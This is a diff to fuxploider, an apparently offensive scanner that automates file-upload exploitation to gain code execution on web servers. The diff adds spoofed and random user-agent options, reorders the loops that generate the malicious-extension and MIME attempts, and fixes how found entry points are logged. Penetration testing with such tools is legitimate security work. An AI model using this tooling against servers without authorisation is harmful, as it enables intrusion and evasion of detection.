@@ -1,10 +1,10 @@
 #!/usr/bin/python3
-import re,requests,argparse,logging,os,coloredlogs,datetime,getpass,tempfile,itertools,json,concurrent.futures
+import re,requests,argparse,logging,os,coloredlogs,datetime,getpass,tempfile,itertools,json,concurrent.futures,random
 from utils import *
 from UploadForm import UploadForm
 from threading import Lock
 #signal.signal(signal.SIGINT, quitting)
-version = "0.4.0"
+version = "0.5.0"
 logging.basicConfig(datefmt='[%m/%d/%Y-%H:%M:%S]')
 logger = logging.getLogger("fuxploider")
 
@@ -49,9 +49,24 @@ parser.add_argument("-s","--skip-recon",action="store_true",required=False,dest=
 parser.add_argument("-y",action="store_true",required=False,dest="detectAllEntryPoints",help="Force detection of every entry points. Will not stop at first code exec found.")
 parser.add_argument("-T","--threads",metavar="Threads",nargs=1,dest="nbThreads",help="Number of parallel tasks (threads).",type=int,default=[4])
 
+exclusiveUserAgentsArgs = parser.add_mutually_exclusive_group()
+exclusiveUserAgentsArgs.add_argument("-U","--user-agent",metavar="useragent",nargs=1,dest="userAgent",help="User-agent to use while requesting the target.",type=str,default=[requests.utils.default_user_agent()])
+exclusiveUserAgentsArgs.add_argument("--random-user-agent",action="store_true",required=False,dest="randomUserAgent",help="Use a random user-agent while requesting the target.")
+
 args = parser.parse_args()
 args.uploadsPath = args.uploadsPath[0]
 args.nbThreads = args.nbThreads[0]
+args.userAgent = args.userAgent[0]
+
+if args.randomUserAgent :
+	with open("user-agents.txt","r") as fd :
+		nb = 0
+		for l in fd :
+			nb += 1
+		fd.seek(0)
+		nb = random.randint(0,nb)
+		for i in range(0,nb) :
+			args.userAgent = fd.readline()[:-1]
 
 if args.template :
 	args.template = args.template[0]
@@ -138,7 +153,7 @@ s = requests.Session()
 if args.cookies :
 	for key in args.cookies.keys() :
 		s.cookies[key] = args.cookies[key]
-
+s.headers = {'User-Agent':args.userAgent}
 ##### PROXY HANDLING #####
 s.trust_env = False
 if args.proxy :
@@ -232,14 +247,13 @@ for template in templates :
 	nastyExt = template["nastyExt"]
 	nastyMime = getMime(extensions,nastyExt)
 	nastyExtVariants = template["extVariants"]
-	for legitExt in up.validExtensions :
-		legitMime = getMime(extensions,legitExt)
+	for t in techniques :
 		for nastyVariant in [nastyExt]+nastyExtVariants :
-			for t in techniques :
+			for legitExt in up.validExtensions :
+				legitMime = getMime(extensions,legitExt)
 				mime = legitMime if t["mime"] == "legit" else nastyMime
 				suffix = t["suffix"].replace("$legitExt$",legitExt).replace("$nastyExt$",nastyVariant)
 				attempts.append({"suffix":suffix,"mime":mime,"templateName":template["templateName"]})
-
 
 
 stopThreads = False
@@ -256,6 +270,7 @@ with concurrent.futures.ThreadPoolExecutor(max_workers=args.nbThreads) as execut
 			codeExecRegex = [t["codeExecRegex"] for t in templates if t["templateName"] == a["templateName"]][0]
 
 			f = executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex)
+			f.a = a
 			futures.append(f)
 
 		for future in concurrent.futures.as_completed(futures) :
@@ -264,9 +279,9 @@ with concurrent.futures.ThreadPoolExecutor(max_workers=args.nbThreads) as execut
 			if not stopThreads :
 				if res["codeExec"] :
 
-					logging.info("\033[1m\033[42mCode execution obtained ('%s','%s','%s')\033[m",suffix,mime,template["filename"])
+					foundEntryPoint = future.a
+					logging.info("\033[1m\033[42mCode execution obtained ('%s','%s','%s')\033[m",foundEntryPoint["suffix"],foundEntryPoint["mime"],foundEntryPoint["templateName"])
 					nbOfEntryPointsFound += 1
-					foundEntryPoint = a
 					entryPoints.append(foundEntryPoint)
 
 					if not args.detectAllEntryPoints :
